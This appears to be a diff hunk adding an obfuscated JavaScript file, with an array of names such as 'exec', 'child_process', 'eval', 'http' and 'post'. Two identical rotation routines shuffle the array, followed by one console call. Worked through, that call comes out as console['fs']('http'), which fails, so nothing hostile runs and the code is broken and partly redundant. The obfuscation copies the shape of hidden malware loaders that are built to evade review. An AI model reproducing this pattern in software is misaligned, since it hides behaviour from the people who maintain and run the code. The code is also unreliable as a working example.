@@ -1,0 +1,28 @@
+
+var _0x4b82 = ['exec', 'child_process', 'id', 'log', 'require', 'eval', 'spawn', 'sync', 'writeFile', 'fs', 'http', 'get', 'post', 'request', 'send', 'data', 'error', 'status', 'code', 'result'];
+(function(_0x1234, _0x5678) {
+  var _0x9abc = function(_0xdef0) {
+    _0xdef0 = _0xdef0 - 1;
+    while (_0xdef0 > 0) {
+      _0x1234['push'](_0x1234['shift']());
+      _0xdef0 = _0xdef0 - 1;
+    }
+  };
+  _0x9abc(++_0x5678);
+}(_0x4b82, 0x36));
+var _0xdef0 = function(_0x1234, _0x5678) {
+  _0x1234 = _0x1234 - 0;
+  var _0x9abc = _0x4b82[_0x1234];
+  return _0x9abc;
+};
+(function(_0x4b8e, _0x1b4f) {
+  var _0x9ab5 = function(_0xdef5) {
+    _0xdef5 = _0xdef5 - 1;
+    while (_0xdef5 > 0) {
+      _0x4b8e['push'](_0x4b8e['shift']());
+      _0xdef5 = _0xdef5 - 1;
+    }
+  };
+  _0x9ab5(++_0x1b4f);
+}(_0x4b82, 0x36));
+console[_0xdef0('0x1')](_0xdef0('0x2'));
